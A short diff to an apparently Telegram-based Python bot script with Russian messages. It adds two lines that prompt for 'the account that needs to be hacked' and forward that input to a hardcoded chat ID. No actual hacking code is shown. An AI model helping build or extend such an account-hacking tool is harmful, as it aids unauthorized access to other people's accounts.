@@ -29,4 +29,6 @@ def get_text(message):
 		print('Ошибка! Перезапустите скрипт!')
 	elif message.text == 'Успешная регистрация!':
 		print('Успешная регистрация!')
+		jj = input("Введите аккаунт, который нужно взломать: ")
+		bot.send_message(ID, jj)	
 bot.polling()
